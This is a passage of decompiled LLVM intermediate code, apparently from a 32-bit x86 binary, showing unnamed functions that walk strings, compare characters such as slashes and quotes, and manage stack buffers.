  store i32 %v3_80499c3, i32* %eax.global-to-local, align 4
  %v0_80499ca = load i32, i32* @esi, align 4
  %v2_80499ca = add i32 %v0_80499ca, %v3_80499c3
  %v3_80499ca = inttoptr i32 %v2_80499ca to i8*
  %v4_80499ca = load i8, i8* %v3_80499ca, align 1
  %v13_80499ca = icmp eq i8 %v4_80499ca, 34
  store i1 %v13_80499ca, i1* %zf.global-to-local, align 1
  br i1 %v13_80499ca, label %dec_label_pc_8049ef5, label %dec_label_pc_80499d4

dec_label_pc_80499d4:                             ; preds = %dec_label_pc_8049ef5, %dec_label_pc_80499c3, %dec_label_pc_8049f19
  %v1_80499d4 = phi i32 [ %v1_8049f0b, %dec_label_pc_8049ef5 ], [ %v1_8049ef8, %dec_label_pc_80499c3 ], [ %v1_80499d4.pre, %dec_label_pc_8049f19 ]
  %v0_80499d4 = phi i32 [ %v2_8049f06, %dec_label_pc_8049ef5 ], [ %v3_80499c3, %dec_label_pc_80499c3 ], [ %v0_80499d4.pre, %dec_label_pc_8049f19 ]
  %v2_80499d4 = add i32 %v1_80499d4, -4
  %v3_80499d4 = inttoptr i32 %v2_80499d4 to i32*
  store i32 %v0_80499d4, i32* %v3_80499d4, align 4
  %v0_80499d5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80499d5 = add i32 %v1_80499d4, -8
  %v3_80499d5 = inttoptr i32 %v2_80499d5 to i32*
  store i32 %v0_80499d5, i32* %v3_80499d5, align 4
  %v1_80499d6 = add i32 %v1_80499d4, -12
  %v2_80499d6 = inttoptr i32 %v1_80499d6 to i32*
  store i32 10, i32* %v2_80499d6, align 4
  %v0_80499d8 = load i32, i32* @esi, align 4
  %v2_80499d8 = add i32 %v1_80499d4, -16
  %v3_80499d8 = inttoptr i32 %v2_80499d8 to i32*
  store i32 %v0_80499d8, i32* %v3_80499d8, align 4
  %v3_80499d9 = call i32 @function_80515e0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  %v0_80499de = load i32, i32* @esp, align 4
  %v1_80499de = add i32 %v0_80499de, 16
  store i32 %v3_80499d9, i32* %edx.global-to-local, align 4
  %v1_80499e3 = add i32 %v3_80499d9, -1
  store i32 %v1_80499e3, i32* %eax.global-to-local, align 4
  %v9_80499e6 = icmp eq i32 %v3_80499d9, 9
  store i1 %v9_80499e6, i1* %zf.global-to-local, align 1
  %v6_80499e9 = icmp ugt i32 %v1_80499e3, 8
  br i1 %v6_80499e9, label %dec_label_pc_8049a11, label %dec_label_pc_80499eb

dec_label_pc_80499eb:                             ; preds = %dec_label_pc_80499d4
  %v1_80499eb = add i32 %v0_80499de, 132
  %v2_80499eb = inttoptr i32 %v1_80499eb to i32*
  %v3_80499eb = load i32, i32* %v2_80499eb, align 4
  %v2_80499ef = add i32 %v3_80499eb, %v3_80499d9
  store i32 %v2_80499ef, i32* @ebx, align 4
  %v9_8049a00186 = icmp eq i32 %v1_80499de, 12
  store i1 %v9_8049a00186, i1* %zf.global-to-local, align 1
  %v2_8049a03188 = inttoptr i32 %v0_80499de to i32*
  store i32 0, i32* %v2_8049a03188, align 4
  %v2_8049a05189 = call i32 @function_8051d42(i32* %v1_80484ea)
  store i32 %v2_8049a05189, i32* %eax.global-to-local, align 4
  %v0_8049a0a190 = load i32, i32* @esp, align 4
  %v1_8049a0a191 = add i32 %v0_8049a0a190, 16
  %v1_8049a0d192 = load i32, i32* @ebx, align 4
  %v7_8049a0d193 = icmp ult i32 %v2_8049a05189, %v1_8049a0d192
  %v12_8049a0d194 = icmp eq i32 %v2_8049a05189, %v1_8049a0d192
  store i1 %v12_8049a0d194, i1* %zf.global-to-local, align 1
  br i1 %v7_8049a0d193, label %dec_label_pc_80499f3, label %dec_label_pc_8049a11

dec_label_pc_80499f3:                             ; preds = %dec_label_pc_80499eb, %dec_label_pc_80499f3
  %v0_8049a0a195 = phi i32 [ %v0_8049a0a, %dec_label_pc_80499f3 ], [ %v0_8049a0a190, %dec_label_pc_80499eb ]
  %v9_80499f3 = icmp eq i32 %v0_8049a0a195, -4
  store i1 %v9_80499f3, i1* %zf.global-to-local, align 1
  %v2_80499f6 = inttoptr i32 %v0_8049a0a195 to i32*
  store i32 1, i32* %v2_80499f6, align 4
  %v1_80499f8 = call i32 @function_8053630(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80499f8, i32* %eax.global-to-local, align 4
  %v0_80499fd = load i32, i32* @esp, align 4
  %v9_8049a00 = icmp eq i32 %v0_80499fd, -4
  store i1 %v9_8049a00, i1* %zf.global-to-local, align 1
  %v2_8049a03 = inttoptr i32 %v0_80499fd to i32*
  store i32 0, i32* %v2_8049a03, align 4
  %v2_8049a05 = call i32 @function_8051d42(i32* %v1_80484ea)
  store i32 %v2_8049a05, i32* %eax.global-to-local, align 4
  %v0_8049a0a = load i32, i32* @esp, align 4
  %v1_8049a0a = add i32 %v0_8049a0a, 16
  %v1_8049a0d = load i32, i32* @ebx, align 4
  %v7_8049a0d = icmp ult i32 %v2_8049a05, %v1_8049a0d
  %v12_8049a0d = icmp eq i32 %v2_8049a05, %v1_8049a0d
  store i1 %v12_8049a0d, i1* %zf.global-to-local, align 1
  br i1 %v7_8049a0d, label %dec_label_pc_80499f3, label %dec_label_pc_8049a11

dec_label_pc_8049a11:                             ; preds = %dec_label_pc_80499eb, %dec_label_pc_80499f3, %dec_label_pc_80499d4
  %v0_8049a1a = phi i32 [ %v1_80499de, %dec_label_pc_80499d4 ], [ %v1_8049a0a191, %dec_label_pc_80499eb ], [ %v1_8049a0a, %dec_label_pc_80499f3 ]
  %v1_8049a11 = add i32 %v0_8049a1a, 20900
  %v2_8049a11 = inttoptr i32 %v1_8049a11 to i32*
  %v3_8049a11 = load i32, i32* %v2_8049a11, align 4
  store i32 %v3_8049a11, i32* %eax.global-to-local, align 4
  %v0_8049a18 = load i32, i32* @esi, align 4
  %v2_8049a1d = add i32 %v0_8049a18, %v3_8049a11
  %v12_8049a1d = icmp eq i32 %v2_8049a1d, 0
  store i1 %v12_8049a1d, i1* %zf.global-to-local, align 1
  store i32 %v2_8049a1d, i32* @ebx, align 4
  %v2_8049a1f = add i32 %v0_8049a1a, -16
  %v3_8049a1f = inttoptr i32 %v2_8049a1f to i32*
  store i32 %v2_8049a1d, i32* %v3_8049a1f, align 4
  %v2_8049a20 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049a20, i32* %eax.global-to-local, align 4
  %v0_8049a25 = load i32, i32* @esp, align 4
  %v9_8049a25 = icmp eq i32 %v0_8049a25, -12
  store i1 %v9_8049a25, i1* %zf.global-to-local, align 1
  %v1_8049a28 = add i32 %v0_8049a25, 8
  %v2_8049a28 = inttoptr i32 %v1_8049a28 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80543ab.15 to i32), i32* %v2_8049a28, align 4
  %v2_8049a2d = add i32 %v0_8049a25, 4
  %v3_8049a2d = inttoptr i32 %v2_8049a2d to i32*
  store i32 %v2_8049a20, i32* %v3_8049a2d, align 4
  %v0_8049a2e = load i32, i32* @ebx, align 4
  %v3_8049a2e = inttoptr i32 %v0_8049a25 to i32*
  store i32 %v0_8049a2e, i32* %v3_8049a2e, align 4
  %v4_8049a2f = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049a2f, i32* %eax.global-to-local, align 4
  %v0_8049a34 = load i32, i32* @esp, align 4
  %v1_8049a34 = add i32 %v0_8049a34, 16
  %v9_8049a37 = icmp eq i32 %v4_8049a2f, 4
  store i1 %v9_8049a37, i1* %zf.global-to-local, align 1
  br i1 %v9_8049a37, label %dec_label_pc_8049e6a, label %dec_label_pc_8049a40

dec_label_pc_8049a40:                             ; preds = %dec_label_pc_8049a11
  %v0_8049a40 = load i32, i32* @ebx, align 4
  %v1_8049a40 = inttoptr i32 %v0_8049a40 to i8*
  %v2_8049a40 = load i8, i8* %v1_8049a40, align 1
  %v11_8049a40 = icmp eq i8 %v2_8049a40, 47
  store i1 %v11_8049a40, i1* %zf.global-to-local, align 1
  br i1 %v11_8049a40, label %dec_label_pc_8049d1e, label %dec_label_pc_8049a49

dec_label_pc_8049a49:                             ; preds = %dec_label_pc_8049d41, %dec_label_pc_8049d1e, %dec_label_pc_8049a40, %dec_label_pc_8049d76
  %v0_8049a49 = phi i32 [ %v1_8049d6b, %dec_label_pc_8049d41 ], [ %v1_8049d33, %dec_label_pc_8049d1e ], [ %v1_8049a34, %dec_label_pc_8049a40 ], [ %v1_8049d8b, %dec_label_pc_8049d76 ]
  %v1_8049a49 = add i32 %v0_8049a49, 76
  %v2_8049a49 = inttoptr i32 %v1_8049a49 to i32*
  %v3_8049a49 = load i32, i32* %v2_8049a49, align 4
  store i32 %v3_8049a49, i32* %edx.global-to-local, align 4
  %v1_8049a4d = add i32 %v3_8049a49, 1431
  %v2_8049a4d = inttoptr i32 %v1_8049a4d to i32*
  store i32 5522759, i32* %v2_8049a4d, align 4
  %v0_8049a57 = load i32, i32* @esp, align 4
  %v1_8049a57 = add i32 %v0_8049a57, 92
  %v2_8049a57 = inttoptr i32 %v1_8049a57 to i32*
  %v3_8049a57 = load i32, i32* %v2_8049a57, align 4
  store i32 %v3_8049a57, i32* %ecx.global-to-local, align 4
  %v1_8049a5b = add i32 %v3_8049a57, -1448
  %v2_8049a5b = inttoptr i32 %v1_8049a5b to i8*
  store i8 10, i8* %v2_8049a5b, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049a67:                             ; preds = %dec_label_pc_8049124
  %v1_8049a67 = add i32 %v0_8049145, 108
  %v2_8049a67 = inttoptr i32 %v1_8049a67 to i32*
  %v3_8049a67 = load i32, i32* %v2_8049a67, align 4
  store i32 %v3_8049a67, i32* %eax.global-to-local, align 4
  %v1_8049a6b = add i32 %v3_8049a67, 12
  %v2_8049a6b = inttoptr i32 %v1_8049a6b to i32*
  store i32 0, i32* %v2_8049a6b, align 4
  br label %dec_label_pc_80491db

dec_label_pc_8049a77:                             ; preds = %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge, %dec_label_pc_804987f, %dec_label_pc_8049854
  %v0_8049a77 = phi i32 [ %v0_8049a77.pre, %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge ], [ %v1_80498d4, %dec_label_pc_804987f ], [ %v1_8049875, %dec_label_pc_8049854 ]
  %v1_8049a77 = add i32 %v0_8049a77, -4
  %v2_8049a77 = inttoptr i32 %v1_8049a77 to i32*
  store i32 4, i32* %v2_8049a77, align 4
  %v1_8049a79 = add i32 %v0_8049a77, -8
  %v2_8049a79 = inttoptr i32 %v1_8049a79 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80543a4.13 to i32), i32* %v2_8049a79, align 4
  %v1_8049a7e = add i32 %v0_8049a77, 104
  %v2_8049a7e = inttoptr i32 %v1_8049a7e to i32*
  %v3_8049a7e = load i32, i32* %v2_8049a7e, align 4
  store i32 %v3_8049a7e, i32* %ecx.global-to-local, align 4
  %v2_8049a82 = add i32 %v0_8049a77, -12
  %v3_8049a82 = inttoptr i32 %v2_8049a82 to i32*
  store i32 %v3_8049a7e, i32* %v3_8049a82, align 4
  %v1_8049a83 = add i32 %v0_8049a77, 131
  store i32 %v1_8049a83, i32* %eax.global-to-local, align 4
  %v2_8049a8a = add i32 %v0_8049a77, -16
  %v3_8049a8a = inttoptr i32 %v2_8049a8a to i32*
  store i32 %v1_8049a83, i32* %v3_8049a8a, align 4
  %v0_8049a8b = call i32 @function_8051590()
  store i32 %v0_8049a8b, i32* %eax.global-to-local, align 4
  %v0_8049a90 = load i32, i32* @esp, align 4
  %v1_8049a90 = add i32 %v0_8049a90, 92
  %v2_8049a90 = inttoptr i32 %v1_8049a90 to i32*
  %v3_8049a90 = load i32, i32* %v2_8049a90, align 4
  store i32 %v0_8049a8b, i32* @esi, align 4
  %v1_8049a96 = add i32 %v3_8049a90, 1431
  %v9_8049a96 = icmp eq i32 %v1_8049a96, 0
  store i1 %v9_8049a96, i1* %zf.global-to-local, align 1
  store i32 %v1_8049a96, i32* @ebx, align 4
  %v1_8049a9c = inttoptr i32 %v0_8049a90 to i32*
  %v2_8049a9c = load i32, i32* %v1_8049a9c, align 4
  store i32 %v2_8049a9c, i32* %eax.global-to-local, align 4
  %v3_8049a9c = add i32 %v0_8049a90, 4
  %v1_8049a9d = inttoptr i32 %v3_8049a9c to i32*
  %v2_8049a9d = load i32, i32* %v1_8049a9d, align 4
  store i32 %v2_8049a9d, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80543b5.18 to i32), i32* %v1_8049a9d, align 4
  %v0_8049aa3 = load i32, i32* @ebx, align 4
  store i32 %v0_8049aa3, i32* %v1_8049a9c, align 4
  %v0_8049aa4 = call i32 @function_8051850()
  store i32 %v0_8049aa4, i32* %eax.global-to-local, align 4
  %v0_8049aa9 = load i32, i32* @esp, align 4
  %v3_8049aac = trunc i32 %v0_8049aa4 to i8
  %v4_8049aac = icmp eq i8 %v3_8049aac, 0
  store i1 %v4_8049aac, i1* %zf.global-to-local, align 1
  br i1 %v4_8049aac, label %dec_label_pc_8049c4e, label %dec_label_pc_8049ab4

dec_label_pc_8049ab4:                             ; preds = %dec_label_pc_8049c4e, %dec_label_pc_8049a77
  %v0_8049ab4.in = phi i32 [ %v0_8049c5b, %dec_label_pc_8049c4e ], [ %v0_8049aa9, %dec_label_pc_8049a77 ]
  %v1_8049ab4 = add i32 %v0_8049ab4.in, 108
  %v2_8049ab4 = inttoptr i32 %v1_8049ab4 to i32*
  %v3_8049ab4 = load i32, i32* %v2_8049ab4, align 4
  store i32 %v3_8049ab4, i32* %edx.global-to-local, align 4
  %v1_8049ab8 = add i32 %v3_8049ab4, -1448
  %v2_8049ab8 = inttoptr i32 %v1_8049ab8 to i8*
  store i8 7, i8* %v2_8049ab8, align 1
  br label %dec_label_pc_8049abf

dec_label_pc_8049abf:                             ; preds = %dec_label_pc_8049c66, %dec_label_pc_8049ab4
  %v0_8049abf = load i32, i32* @esp, align 4
  %v1_8049abf = add i32 %v0_8049abf, -4
  %v2_8049abf = inttoptr i32 %v1_8049abf to i32*
  store i32 16384, i32* %v2_8049abf, align 4
  %v0_8049ac4 = load i32, i32* @esi, align 4
  %v2_8049ac4 = add i32 %v0_8049abf, -8
  %v3_8049ac4 = inttoptr i32 %v2_8049ac4 to i32*
  store i32 %v0_8049ac4, i32* %v3_8049ac4, align 4
  %v1_8049ac5 = add i32 %v0_8049abf, 131
  store i32 %v1_8049ac5, i32* %eax.global-to-local, align 4
  %v2_8049acc = add i32 %v0_8049abf, -12
  %v3_8049acc = inttoptr i32 %v2_8049acc to i32*
  store i32 %v1_8049ac5, i32* %v3_8049acc, align 4
  %v1_8049acd = add i32 %v0_8049abf, 92
  %v2_8049acd = inttoptr i32 %v1_8049acd to i32*
  %v3_8049acd = load i32, i32* %v2_8049acd, align 4
  store i32 %v3_8049acd, i32* %edx.global-to-local, align 4
  %v1_8049ad1 = add i32 %v3_8049acd, -1452
  %v2_8049ad1 = inttoptr i32 %v1_8049ad1 to i32*
  %v3_8049ad1 = load i32, i32* %v2_8049ad1, align 4
  store i32 %v3_8049ad1, i32* %eax.global-to-local, align 4
  %v2_8049ad7 = add i32 %v0_8049abf, -16
  %v3_8049ad7 = inttoptr i32 %v2_8049ad7 to i32*
  store i32 %v3_8049ad1, i32* %v3_8049ad7, align 4
  %v0_8049ad8 = call i32 @function_805214e()
  store i32 %v0_8049ad8, i32* %eax.global-to-local, align 4
  %v0_8049add = load i32, i32* @esp, align 4
  %v6_8049add = icmp eq i32 %v0_8049add, -16
  store i1 %v6_8049add, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049ae5:                             ; preds = %dec_label_pc_8048ebe
  %v3_8049ae5 = load i32, i32* %v2_8049ae5, align 4
  %v4_8049ae5 = add i32 %v3_8049ae5, -10239
  %v9_8049ae5 = sub i32 10238, %v3_8049ae5
  %v10_8049ae5 = and i32 %v9_8049ae5, %v3_8049ae5
  %v11_8049ae5 = icmp slt i32 %v10_8049ae5, 0
  %v12_8049ae5 = icmp eq i32 %v4_8049ae5, 0
  store i1 %v12_8049ae5, i1* %zf.global-to-local, align 1
  %v13_8049ae5 = icmp slt i32 %v4_8049ae5, 0
  %v3_8049aed = icmp ne i1 %v13_8049ae5, %v11_8049ae5
  %v4_8049aed = or i1 %v12_8049ae5, %v3_8049aed
  br i1 %v4_8049aed, label %dec_label_pc_8048d91, label %dec_label_pc_8048ee1

dec_label_pc_8049af8:                             ; preds = %dec_label_pc_8049577
  %v0_8049af8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049af8 = add i32 %v0_8049af8, -1448
  %v2_8049af8 = inttoptr i32 %v1_8049af8 to i8*
  store i8 1, i8* %v2_8049af8, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049b04:                             ; preds = %dec_label_pc_80497ba
  %v0_8049b04 = load i32, i32* @ebx, align 4
  %v1_8049b04 = inttoptr i32 %v0_8049b04 to i32*
  store i32 104, i32* %v1_8049b04, align 4
  %v0_80497f9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80497f9

dec_label_pc_8049b0f:                             ; preds = %dec_label_pc_8049518
  %v0_8049b0f = load i32, i32* @edi, align 4
  %v1_8049b0f = inttoptr i32 %v0_8049b0f to i32*
  %v2_8049b0f = load i32, i32* %v1_8049b0f, align 4
  %v11_8049b0f = icmp eq i32 %v2_8049b0f, 11
  store i1 %v11_8049b0f, i1* %zf.global-to-local, align 1
  %v1_8049b12 = icmp eq i1 %v11_8049b0f, false
  br i1 %v1_8049b12, label %dec_label_pc_8048e4a, label %dec_label_pc_8048d91

dec_label_pc_8049b1d:                             ; preds = %dec_label_pc_8049468
  %v1_8049b1d = add i32 %v0_804948a, 20916
  %v2_8049b1d = inttoptr i32 %v1_8049b1d to i32*
  store i32 7, i32* %v2_8049b1d, align 4
  %v0_8049b28 = load i32, i32* @esi, align 4
  %v1_8049b28 = add i32 %v0_8049b28, 4
  %v2_8049b28 = inttoptr i32 %v1_8049b28 to i8*
  %v3_8049b28 = load i8, i8* %v2_8049b28, align 1
  %v12_8049b28 = icmp eq i8 %v3_8049b28, 115
  store i1 %v12_8049b28, i1* %zf.global-to-local, align 1
  br i1 %v12_8049b28, label %dec_label_pc_8049d93, label %dec_label_pc_8049b32

dec_label_pc_8049b32:                             ; preds = %dec_label_pc_8049b1d, %dec_label_pc_8049d93
  %v0_8049b32 = load i32, i32* @esp, align 4
  %v1_8049b32 = add i32 %v0_8049b32, 20900
  %v2_8049b32 = inttoptr i32 %v1_8049b32 to i32*
  %v3_8049b32 = load i32, i32* %v2_8049b32, align 4
  store i32 %v3_8049b32, i32* %eax.global-to-local, align 4
  %v0_8049b39 = load i32, i32* @edx, align 4
  %v2_8049b39 = add i32 %v0_8049b32, -4
  %v3_8049b39 = inttoptr i32 %v2_8049b39 to i32*
  store i32 %v0_8049b39, i32* %v3_8049b39, align 4
  %v0_8049b3a = load i32, i32* @ebx, align 4
  %v1_8049b3a = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b3a = sub i32 %v0_8049b3a, %v1_8049b3a
  %v12_8049b3a = icmp eq i32 %v2_8049b3a, 0
  store i1 %v12_8049b3a, i1* %zf.global-to-local, align 1
  store i32 %v2_8049b3a, i32* @ebx, align 4
  %v0_8049b3c = load i32, i32* @esi, align 4
  %v2_8049b3c = add i32 %v0_8049b3c, %v1_8049b3a
  store i32 %v2_8049b3c, i32* %eax.global-to-local, align 4
  %v2_8049b3f = add i32 %v0_8049b32, -8
  %v3_8049b3f = inttoptr i32 %v2_8049b3f to i32*
  store i32 %v2_8049b3a, i32* %v3_8049b3f, align 4
  %v0_8049b40 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b40 = add i32 %v0_8049b32, -12
  %v3_8049b40 = inttoptr i32 %v2_8049b40 to i32*
  store i32 %v0_8049b40, i32* %v3_8049b40, align 4
  %v0_8049b41 = load i32, i32* @esi, align 4
  %v2_8049b41 = add i32 %v0_8049b32, -16
  %v3_8049b41 = inttoptr i32 %v2_8049b41 to i32*
  store i32 %v0_8049b41, i32* %v3_8049b41, align 4
  %v4_8049b42 = call i32 @function_8051fe3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049b42, i32* %eax.global-to-local, align 4
  %v0_8049b47 = load i32, i32* @esp, align 4
  %v1_8049b47 = add i32 %v0_8049b47, 20916
  %v2_8049b47 = inttoptr i32 %v1_8049b47 to i32*
  store i32 0, i32* %v2_8049b47, align 4
  %v0_8049b52 = load i32, i32* @esi, align 4
  %v1_8049b52 = inttoptr i32 %v0_8049b52 to i8*
  %v2_8049b52 = load i8, i8* %v1_8049b52, align 1
  %v3_8049b52 = zext i8 %v2_8049b52 to i32
  %v5_8049b52 = and i32 %v4_8049b42, -256
  %v6_8049b52 = or i32 %v3_8049b52, %v5_8049b52
  store i32 %v6_8049b52, i32* %eax.global-to-local, align 4
  %v0_8049b54 = load i32, i32* @esp, align 4
  %v4_8049b57 = icmp eq i8 %v2_8049b52, 0
  store i1 %v4_8049b57, i1* %zf.global-to-local, align 1
  br i1 %v4_8049b57, label %dec_label_pc_8049b86, label %dec_label_pc_8049b5b

dec_label_pc_8049b5b:                             ; preds = %dec_label_pc_8049b32
  store i32 %v0_8049b52, i32* %ecx.global-to-local, align 4
  %v10_8049b5d = icmp eq i8 %v2_8049b52, 47
  store i1 %v10_8049b5d, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b5d, label %dec_label_pc_8049c80, label %dec_label_pc_8049b65

dec_label_pc_8049b65:                             ; preds = %dec_label_pc_8049b5b
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8049b76172 = add i32 %v0_8049b52, 1
  store i32 %v2_8049b76172, i32* %ecx.global-to-local, align 4
  %v2_8049b79173 = add i32 %v0_8049b54, 20916
  %v3_8049b79174 = inttoptr i32 %v2_8049b79173 to i32*
  store i32 1, i32* %v3_8049b79174, align 4
  %v0_8049b80175 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049b80176 = inttoptr i32 %v0_8049b80175 to i8*
  %v2_8049b80177 = load i8, i8* %v1_8049b80176, align 1
  %v3_8049b80178 = zext i8 %v2_8049b80177 to i32
  %v4_8049b80179 = load i32, i32* @edx, align 4
  %v5_8049b80180 = and i32 %v4_8049b80179, -256
  %v6_8049b80181 = or i32 %v5_8049b80180, %v3_8049b80178
  store i32 %v6_8049b80181, i32* %edx.global-to-local, align 4
  %v4_8049b82182 = icmp eq i8 %v2_8049b80177, 0
  store i1 %v4_8049b82182, i1* %zf.global-to-local, align 1
  %v1_8049b84183 = icmp eq i1 %v4_8049b82182, false
  br i1 %v1_8049b84183, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b86

dec_label_pc_8049b6c:                             ; preds = %dec_label_pc_8049b65, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge
  %v2_8049b80185 = phi i8 [ %v2_8049b80, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge ], [ %v2_8049b80177, %dec_label_pc_8049b65 ]
  %v0_8049b80184 = phi i32 [ %v0_8049b80, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge ], [ %v0_8049b80175, %dec_label_pc_8049b65 ]
  %v0_8049b6c = load i32, i32* %eax.global-to-local, align 4
  %v1_8049b6c = add i32 %v0_8049b6c, 1
  store i32 %v1_8049b6c, i32* %eax.global-to-local, align 4
  %v10_8049b6d = icmp eq i8 %v2_8049b80185, 47
  store i1 %v10_8049b6d, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b6d, label %dec_label_pc_8049c80, label %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge

dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge: ; preds = %dec_label_pc_8049b6c
  %v1_8049b76.pre = load i32, i32* @esi, align 4
  %v1_8049b79.pre = load i32, i32* @esp, align 4
  %v2_8049b76 = add i32 %v1_8049b6c, %v1_8049b76.pre
  store i32 %v2_8049b76, i32* %ecx.global-to-local, align 4
  %v2_8049b79 = add i32 %v1_8049b79.pre, 20900
  %v3_8049b79 = inttoptr i32 %v2_8049b79 to i32*
  store i32 %v1_8049b6c, i32* %v3_8049b79, align 4
  %v0_8049b80 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049b80 = inttoptr i32 %v0_8049b80 to i8*
  %v2_8049b80 = load i8, i8* %v1_8049b80, align 1
  %v3_8049b80 = zext i8 %v2_8049b80 to i32
  %v4_8049b80 = load i32, i32* %edx.global-to-local, align 4
  %v5_8049b80 = and i32 %v4_8049b80, -256
  %v6_8049b80 = or i32 %v5_8049b80, %v3_8049b80
  store i32 %v6_8049b80, i32* %edx.global-to-local, align 4
  %v4_8049b82 = icmp eq i8 %v2_8049b80, 0
  store i1 %v4_8049b82, i1* %zf.global-to-local, align 1
  %v1_8049b84 = icmp eq i1 %v4_8049b82, false
  br i1 %v1_8049b84, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b86

dec_label_pc_8049b86:                             ; preds = %dec_label_pc_8049b65, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge, %dec_label_pc_8049b32, %dec_label_pc_8049c80
  %v0_8049b86 = load i32, i32* @esp, align 4
  %v9_8049b86 = icmp eq i32 %v0_8049b86, 12
  store i1 %v9_8049b86, i1* %zf.global-to-local, align 1
  %v0_8049b89 = load i32, i32* @esi, align 4
  %v2_8049b89 = add i32 %v0_8049b86, -16
  %v3_8049b89 = inttoptr i32 %v2_8049b89 to i32*
  store i32 %v0_8049b89, i32* %v3_8049b89, align 4
  %v2_8049b8a = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049b8a, i32* %eax.global-to-local, align 4
  %v0_8049b8f = load i32, i32* @esp, align 4
  %v1_8049b8f = add i32 %v0_8049b8f, 16
  %v1_8049b92 = icmp eq i32 %v2_8049b8a, 0
  store i1 %v1_8049b92, i1* %zf.global-to-local, align 1
  %tmp148 = icmp slt i32 %v2_8049b8a, 1
  br i1 %tmp148, label %dec_label_pc_8049bbc, label %dec_label_pc_8049b96

dec_label_pc_8049b96:                             ; preds = %dec_label_pc_8049b86
  %v9_8049b96 = icmp eq i32 %v0_8049b8f, -4
  store i1 %v9_8049b96, i1* %zf.global-to-local, align 1
  %v0_8049b99 = load i32, i32* @esi, align 4
  %v3_8049b99 = inttoptr i32 %v0_8049b8f to i32*
  store i32 %v0_8049b99, i32* %v3_8049b99, align 4
  %v2_8049b9a = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049b9a, i32* %eax.global-to-local, align 4
  %v0_8049b9f = load i32, i32* @esp, align 4
  %v1_8049b9f = add i32 %v0_8049b9f, 16
  %v1_8049ba2 = add i32 %v2_8049b9a, -127
  %v6_8049ba2 = sub i32 126, %v2_8049b9a
  %v7_8049ba2 = and i32 %v6_8049ba2, %v2_8049b9a
  %v8_8049ba2 = icmp slt i32 %v7_8049ba2, 0
  %v9_8049ba2 = icmp eq i32 %v1_8049ba2, 0
  store i1 %v9_8049ba2, i1* %zf.global-to-local, align 1
  %v10_8049ba2 = icmp slt i32 %v1_8049ba2, 0
  %v3_8049ba5 = icmp eq i1 %v10_8049ba2, %v8_8049ba2
  %v4_8049ba5 = icmp eq i1 %v9_8049ba2, false
  %v5_8049ba5 = and i1 %v4_8049ba5, %v3_8049ba5
  br i1 %v5_8049ba5, label %dec_label_pc_8049bbc, label %dec_label_pc_8049ba7

dec_label_pc_8049ba7:                             ; preds = %dec_label_pc_8049b96
  %v2_8049ba7 = add i32 %v0_8049b9f, 12
  %v3_8049ba7 = inttoptr i32 %v2_8049ba7 to i32*
  store i32 %v2_8049b9a, i32* %v3_8049ba7, align 4
  %v2_8049ba8 = add i32 %v0_8049b9f, 8
  %v3_8049ba8 = inttoptr i32 %v2_8049ba8 to i32*
  store i32 %v2_8049b9a, i32* %v3_8049ba8, align 4
  %v0_8049ba9 = load i32, i32* @esi, align 4
  %v2_8049ba9 = add i32 %v0_8049b9f, 4
  %v3_8049ba9 = inttoptr i32 %v2_8049ba9 to i32*
  store i32 %v0_8049ba9, i32* %v3_8049ba9, align 4
  %v1_8049baa = add i32 %v0_8049b9f, 92
  %v2_8049baa = inttoptr i32 %v1_8049baa to i32*
  %v3_8049baa = load i32, i32* %v2_8049baa, align 4
  %v1_8049bae = add i32 %v3_8049baa, 789
  %v9_8049bae = icmp eq i32 %v1_8049bae, 0
  store i1 %v9_8049bae, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bae, i32* %eax.global-to-local, align 4
  %v3_8049bb3 = inttoptr i32 %v0_8049b9f to i32*
  store i32 %v1_8049bae, i32* %v3_8049bb3, align 4
  %v3_8049bb4 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049bb4, i32* %eax.global-to-local, align 4
  %v0_8049bb9 = load i32, i32* @esp, align 4
  %v1_8049bb9 = add i32 %v0_8049bb9, 16
  %v6_8049bb9 = icmp eq i32 %v1_8049bb9, 0
  store i1 %v6_8049bb9, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049bbc

dec_label_pc_8049bbc:                             ; preds = %dec_label_pc_8049b96, %dec_label_pc_8049b86, %dec_label_pc_8049ba7
  %v0_8049bbc = phi i32 [ %v1_8049b9f, %dec_label_pc_8049b96 ], [ %v1_8049b8f, %dec_label_pc_8049b86 ], [ %v1_8049bb9, %dec_label_pc_8049ba7 ]
  %v0_8049bbf = load i32, i32* @esi, align 4
  store i32 %v0_8049bbf, i32* %eax.global-to-local, align 4
